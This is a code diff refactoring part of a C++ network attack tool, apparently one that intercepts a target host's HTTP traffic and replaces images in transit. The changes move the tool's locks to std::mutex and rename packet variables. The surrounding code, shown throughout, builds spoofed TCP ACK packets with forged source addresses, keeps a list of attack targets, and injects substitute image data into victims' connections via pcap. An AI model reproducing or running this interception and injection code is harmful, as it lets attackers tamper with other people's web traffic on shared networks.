@@ -18,7 +18,7 @@ MacAddress g_gatewayMac;
 std::map<DWORD, HostInfoSetting> g_host;
 std::map<DWORD, HostInfoSetting*> g_attackList;
 std::map<MacAddress, HostInfoSetting*> g_attackListMac;
-CCriticalSection g_hostAttackListLock;
+std::mutex g_hostAttackListLock;
 
 
 static void ReplaceImageThread(DWORD targetIp, WORD targetPort)
@@ -28,12 +28,12 @@ static void ReplaceImageThread(DWORD targetIp, WORD targetPort)
 		return;
 
 	// get infomation
-	g_hostAttackListLock.Lock();
+	g_hostAttackListLock.lock();
 	HostInfoSetting& target = g_host[targetIp];
-	g_hostAttackListLock.Unlock();
-	target.httpImageLinkLock.Lock();
+	g_hostAttackListLock.unlock();
+	target.httpImageLinkLock.lock();
 	auto& link = target.httpImageLink[targetPort];
-	target.httpImageLinkLock.Unlock();
+	target.httpImageLinkLock.unlock();
 	IPPacket* pInitIp = (IPPacket*)&link.initPacket[ETH_LENGTH];
 	DWORD ipLen = pInitIp->headerLen * 4;
 	TCPPacket* pInitTcp = (TCPPacket*)&link.initPacket[ETH_LENGTH + ipLen];
@@ -48,20 +48,20 @@ static void ReplaceImageThread(DWORD targetIp, WORD targetPort)
 	*(MacAddress*)ackPkt.get() = g_gatewayMac;
 	*(MacAddress*)(ackPkt.get() + 6) = g_selfMac;
 	memcpy(ackPkt.get() + 12, link.initPacket.get() + 12, 2 + ipLen + tcpLen);
-	IPPacket* pPktIp = (IPPacket*)(ackPkt.get() + ETH_LENGTH);
-	pPktIp->identification = htons(ntohs(pPktIp->identification) + 1);
-	pPktIp->totalLen = htons((WORD)(ipLen + tcpLen));
-	pPktIp->timeToLive = 64;
-	pPktIp->sourceIp = targetIp;
-	pPktIp->destinationIp = pInitIp->sourceIp;
-	pPktIp->CalcCheckSum();
-	TCPPacket* pPktTcp = (TCPPacket*)(ackPkt.get() + ETH_LENGTH + ipLen);
-	pPktTcp->sourcePort = targetPort;
-	pPktTcp->destinationPort = pInitTcp->sourcePort;
-	pPktTcp->seq = pInitTcp->ack;
-	pPktTcp->ack = htonl(ntohl(pInitTcp->seq) + (link.initPacketLen - ETH_LENGTH - ipLen - tcpLen));
-	pPktTcp->psh = 0;
-	pPktTcp->CalcCheckSum(pPktIp->sourceIp, pPktIp->destinationIp, (WORD)tcpLen);
+	IPPacket* pAckIp = (IPPacket*)(ackPkt.get() + ETH_LENGTH);
+	pAckIp->identification = htons(ntohs(pAckIp->identification) + 1);
+	pAckIp->totalLen = htons((WORD)(ipLen + tcpLen));
+	pAckIp->timeToLive = 64;
+	pAckIp->sourceIp = targetIp;
+	pAckIp->destinationIp = pInitIp->sourceIp;
+	pAckIp->CalcCheckSum();
+	TCPPacket* pAckTcp = (TCPPacket*)(ackPkt.get() + ETH_LENGTH + ipLen);
+	pAckTcp->sourcePort = targetPort;
+	pAckTcp->destinationPort = pInitTcp->sourcePort;
+	pAckTcp->seq = pInitTcp->ack;
+	pAckTcp->ack = htonl(ntohl(pInitTcp->seq) + (link.initPacketLen - ETH_LENGTH - ipLen - tcpLen));
+	pAckTcp->psh = 0;
+	pAckTcp->CalcCheckSum(pAckIp->sourceIp, pAckIp->destinationIp, (WORD)tcpLen);
 	pcap_sendpacket(adapter.get(), (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
 
 	CString exp;
@@ -72,23 +72,24 @@ static void ReplaceImageThread(DWORD targetIp, WORD targetPort)
 	pcap_pkthdr* header;
 	const BYTE* pkt_data;
 	int res;
-	DWORD lastAck = ntohl(pPktTcp->ack);
+	DWORD lastAck = ntohl(pAckTcp->ack);
 	while ((res = pcap_next_ex(adapter.get(), &header, &pkt_data)) >= 0 && GetTickCount() - time < 5000)
 	{
 		if (res == 0) // timeout
 			continue;
-		IPPacket* pCurIp = (IPPacket*)&pkt_data[ETH_LENGTH];
+
+		const IPPacket* pCurIp = (const IPPacket*)&pkt_data[ETH_LENGTH];
 		DWORD curIpLength = pCurIp->headerLen * 4;
-		TCPPacket* pCurTcp = (TCPPacket*)&pkt_data[ETH_LENGTH + curIpLength];
+		const TCPPacket* pCurTcp = (const TCPPacket*)&pkt_data[ETH_LENGTH + curIpLength];
 		DWORD curTcpLength = pCurTcp->headerLen * 4;
 
-		pPktIp->identification = htons(ntohs(pPktIp->identification) + 1);
-		pPktIp->CalcCheckSum();
+		pAckIp->identification = htons(ntohs(pAckIp->identification) + 1);
+		pAckIp->CalcCheckSum();
 		DWORD ack = ntohl(pCurTcp->seq) + (header->len - ETH_LENGTH - curIpLength - curTcpLength);
 		if (lastAck < ack)
 			lastAck = ack;
-		pPktTcp->ack = htonl(lastAck);
-		pPktTcp->CalcCheckSum(pPktIp->sourceIp, pPktIp->destinationIp, (WORD)tcpLen);
+		pAckTcp->ack = htonl(lastAck);
+		pAckTcp->CalcCheckSum(pAckIp->sourceIp, pAckIp->destinationIp, (WORD)tcpLen);
 		pcap_sendpacket(adapter.get(), (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
 		if (pCurTcp->psh)
 			break;
@@ -178,14 +179,14 @@ static void ReplaceImageThread(DWORD targetIp, WORD targetPort)
 	DWORD start;
 	for (start = 0; start + maxTcpDataLen < target.imageDataLen - 1; start += maxTcpDataLen)
 	{
-		target.imageDataLock.Lock();
+		target.imageDataLock.lock();
 		if (target.imageData == nullptr)
 		{
-			target.imageDataLock.Unlock();
+			target.imageDataLock.unlock();
 			goto End;
 		}
 		memcpy(pTcpData, &target.imageData[start], maxTcpDataLen);
-		target.imageDataLock.Unlock();
+		target.imageDataLock.unlock();
 		pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + maxTcpDataLen)); // TCP checksum
 		pcap_sendpacket(adapter.get(), (u_char*)sendBuf.get(), sendBufLen);
 		pTcp->seq = htonl(ntohl(pTcp->seq) + maxTcpDataLen);
@@ -193,14 +194,14 @@ static void ReplaceImageThread(DWORD targetIp, WORD targetPort)
 
 	// last packet
 	DWORD lastTcpDataLen = target.imageDataLen - start;
-	target.imageDataLock.Lock();
+	target.imageDataLock.lock();
 	if (target.imageData == nullptr)
 	{
-		target.imageDataLock.Unlock();
+		target.imageDataLock.unlock();
 		goto End;
 	}
 	memcpy(pTcpData, &target.imageData[start], lastTcpDataLen);
-	target.imageDataLock.Unlock();
+	target.imageDataLock.unlock();
 	pIp->totalLen = htons((u_short)(ipLen + tcpLen + lastTcpDataLen));				// IP total length
 	pIp->CalcCheckSum();															// IP checksum
 	pTcp->psh = 1;
@@ -213,9 +214,9 @@ static void ReplaceImageThread(DWORD targetIp, WORD targetPort)
 	///////////////////////////////////////////////////////////////////////////////////
 	// release
 End:
-	target.httpImageLinkLock.Lock();
+	target.httpImageLinkLock.lock();
 	target.httpImageLink.erase(targetPort);
-	target.httpImageLinkLock.Unlock();
+	target.httpImageLinkLock.unlock();
 }
 
 void PacketHandleThread()
@@ -239,9 +240,9 @@ void PacketHandleThread()
 
 #pragma region Target Packet
 		{
-		g_hostAttackListLock.Lock();
+		g_hostAttackListLock.lock();
 		auto targetIt = g_attackListMac.find(*(MacAddress*)(pkt_data + 6));
-		g_hostAttackListLock.Unlock();
+		g_hostAttackListLock.unlock();
 		if (targetIt != g_attackListMac.end()) // is target packet
 		{
 			HostInfoSetting& target = *targetIt->second;
@@ -254,13 +255,13 @@ void PacketHandleThread()
 				if (pIp->protocol == PROTOCOL_TCP)
 				{
 					TCPPacket* pTcp = (TCPPacket*)&pkt_data[ETH_LENGTH + pIp->headerLen * 4];
-					target.httpImageLinkLock.Lock();
+					target.httpImageLinkLock.lock();
 					if (target.httpImageLink.find(pTcp->sourcePort) != target.httpImageLink.end())
 					{
-						target.httpImageLinkLock.Unlock();
+						target.httpImageLinkLock.unlock();
 						continue;
 					}
-					target.httpImageLinkLock.Unlock();
+					target.httpImageLinkLock.unlock();
 				}
 
 				std::unique_ptr<BYTE[]> newData(new BYTE[header->len]);
@@ -279,9 +280,9 @@ void PacketHandleThread()
 			&& *(WORD*)&pkt_data[12] == PROTOCOL_IP) // IP
 		{
 			IPPacket* pIp = (IPPacket*)&pkt_data[ETH_LENGTH];
-			g_hostAttackListLock.Lock();
+			g_hostAttackListLock.lock();
 			auto targetIt = g_attackList.find(pIp->destinationIp);
-			g_hostAttackListLock.Unlock();
+			g_hostAttackListLock.unlock();
 			if (targetIt == g_attackList.end()) // not to target
 				continue;
 			HostInfoSetting& target = *targetIt->second;
@@ -296,13 +297,13 @@ void PacketHandleThread()
 				goto Forward;
 
 			// is replacing
-			target.httpImageLinkLock.Lock();
+			target.httpImageLinkLock.lock();
 			if (target.httpImageLink.find(pTcp->destinationPort) != target.httpImageLink.end())
 			{
-				target.httpImageLinkLock.Unlock();
+				target.httpImageLinkLock.unlock();
 				continue;
 			}
-			target.httpImageLinkLock.Unlock();
+			target.httpImageLinkLock.unlock();
 
 			DWORD tcpLength = pTcp->headerLen * 4;
 			// not HTTP
@@ -317,15 +318,17 @@ void PacketHandleThread()
 
 				
 			// replace image
-			target.httpImageLinkLock.Lock();
+			target.httpImageLinkLock.lock();
 			auto& link = target.httpImageLink[pTcp->destinationPort];
-			target.httpImageLinkLock.Unlock();
+			target.httpImageLinkLock.unlock();
 			link.sourcePort = pTcp->sourcePort;
 			link.initPacketLen = header->len;
 			link.initPacket.reset(new BYTE[header->len]);
 			memcpy(link.initPacket.get(), pkt_data, header->len);
+			{
 			std::thread thread(ReplaceImageThread, target.ip, pTcp->destinationPort);
 			thread.detach();
+			}
 			continue;
 			
 Forward:
